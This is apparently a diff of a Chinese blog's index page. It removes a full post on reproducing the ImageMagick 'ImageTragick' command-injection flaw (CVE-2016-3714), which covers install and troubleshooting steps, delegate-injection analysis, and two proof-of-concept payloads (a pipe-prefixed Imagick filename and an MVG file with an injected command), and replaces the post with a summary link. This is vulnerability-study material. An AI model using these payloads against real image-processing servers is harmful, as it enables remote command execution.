@@ -414,47 +414,14 @@
 
       
         
-          
-            <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。</p>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">tar -vxjf ImageMagick-6.9.5-3.tar.bz2 </div><div class="line"><span class="built_in">cd</span> ImageMagick-6.9.5-3</div><div class="line">./configure --prefix=/opt/bokee/ImageMagick --enable-share --enable-static</div><div class="line">make</div><div class="line">make install</div><div class="line">vim ~/.bash_profile</div></pre></td></tr></table></figure>
-<p>输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PATH=$PATH:/opt/bokee/ImageMagick/bin</div><div class="line">export LD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/lib</div><div class="line">export DYLD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/lib</div><div class="line">export PATH</div></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> ~/.bash_profile</div><div class="line">convert -version</div></pre></td></tr></table></figure>
-<p>这样就安装完毕了ImageMagick，下面安装php扩展</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">wget http://pecl.php.net/get/imagick-3.1.2.tgz</div><div class="line">tar zxvf imagick-3.1.2.tgz</div><div class="line"><span class="built_in">cd</span> imagick-3.1.2</div><div class="line">/opt/lampp/bin/phpize <span class="comment"># 据自己的情况找到这个文件运行 find / -name phpize</span></div><div class="line"><span class="built_in">export</span> PKG_CONFIG_PATH=/opt/bokee/ImageMagick/lib/pkgconfig/</div><div class="line"><span class="built_in">export</span> C_INCLUDE_PATH=<span class="variable">$C_INCLUDE_PATH</span>:/opt/bokee/ImageMagick/include/ImageMagick-6/</div><div class="line">./configure --with-imagick=/opt/bokee/ImageMagick</div><div class="line">make</div><div class="line">make install</div><div class="line">ldconfig</div><div class="line">find / -name php.ini</div><div class="line">vi /opt/lampp/etc/php.ini</div><div class="line">添加：extension = <span class="string">"imagick.so"</span></div></pre></td></tr></table></figure>
-<h1 id="错误以及解决方法"><a href="#错误以及解决方法" class="headerlink" title="错误以及解决方法"></a>错误以及解决方法</h1><p>运行/usr/local/webserver/php/bin/phpize时出现：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Configuring for:</div><div class="line">PHP Api Version:         20041225</div><div class="line">Zend Module Api No:      20060613</div><div class="line">Zend Extension Api No:   220060519</div><div class="line">Cannot find autoconf. Please check your autoconf installation and the</div><div class="line">$PHP_AUTOCONF environment variable. Then, rerun this script.</div></pre></td></tr></table></figure>
-<p>解决方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">cd /usr/src</div><div class="line">wget http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gz</div><div class="line">tar -zvxf m4-1.4.9.tar.gz</div><div class="line">cd m4-1.4.9/</div><div class="line">./configure &amp;&amp; make &amp;&amp; make install</div><div class="line">cd ../</div><div class="line">wget http://ftp.gnu.org/gnu/autoconf/autoconf-2.62.tar.gz</div><div class="line">tar -zvxf autoconf-2.62.tar.gz</div><div class="line">cd autoconf-2.62/</div><div class="line">./configure &amp;&amp; make &amp;&amp; make install</div></pre></td></tr></table></figure>
-<p>如果出现如下错误：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">configure: error: Cannot find php-config. Please use --with-php-config=PATH</div></pre></td></tr></table></figure>
-<p>解决方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">find / -name  php-config</div><div class="line">./configure --with-php-config=/opt/lampp/bin/php-config  --with-imagick=/opt/bokee/ImageMagick</div></pre></td></tr></table></figure>
-<p>如果出现如下错误：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wand/MagickWand.h: No such file or directory</div></pre></td></tr></table></figure>
-<p>解决方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/</div></pre></td></tr></table></figure>
-<p>如果出现如下错误：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system.</div></pre></td></tr></table></figure>
-<p>解决方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">vi /opt/lampp/lampp</div><div class="line"># XAMPP is currently 32 bit only</div><div class="line">#case `uname -m` in</div><div class="line">#    *_64)</div><div class="line">#    if /opt/lampp/bin/php -v &gt; /dev/null 2&gt;&amp;1</div><div class="line">#    then</div><div class="line">#        :</div><div class="line">#    else</div><div class="line">#        $de &amp;&amp; echo &quot;XAMPP gibt es zur Zeit nur als 32-Bit Applikation. Bitte verwende eine 32-Bit Kompatibilitaetsbibliothek fuer Dein System.&quot;</div><div class="line">#        $de || echo &quot;XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system.&quot;</div><div class="line">#        exit</div><div class="line">#    fi</div><div class="line">#    ;;</div><div class="line">#esac</div></pre></td></tr></table></figure>
-<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p>
-<p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的.</p>
-<p>在ImageMagick的默认配置文件里可以看到所有的委托：<code>/etc/ImageMagick/delegates.xml</code><br>拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="ImageMagick-popen-utf8命令注入"><a href="#ImageMagick-popen-utf8命令注入" class="headerlink" title="ImageMagick popen_utf8命令注入"></a>ImageMagick popen_utf8命令注入</h2><ul>
-<li>漏洞版本:   ImageMagick 6.9.3-9及以下</li>
-</ul>
-<p>其实就是文件名引发的命令执行。</p>
-<p>payload :</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">new</span> Imagick(<span class="string">'|touch /tmp/niubl'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="ImageMagick-命令注入"><a href="#ImageMagick-命令注入" class="headerlink" title="ImageMagick 命令注入"></a>ImageMagick 命令注入</h2><ul>
-<li>漏洞版本:   ImageMagick 6.9.3-9及以下</li>
-</ul>
-<p>payload :</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://example.com/image.jpg&quot;|ls &quot;-la)&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
-<p>将以上内容保存为test.png图片，执行convert test.png 1.png，就会执行命令。</p>
-
-          
+          <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/03/14/imageMagick-linux-code-execution/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1869,7 +1836,7 @@
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
+              <a href="/tags/index-1.html">
                 <span class="site-state-item-count">29</span>
                 <span class="site-state-item-name">标签</span>
               </a>
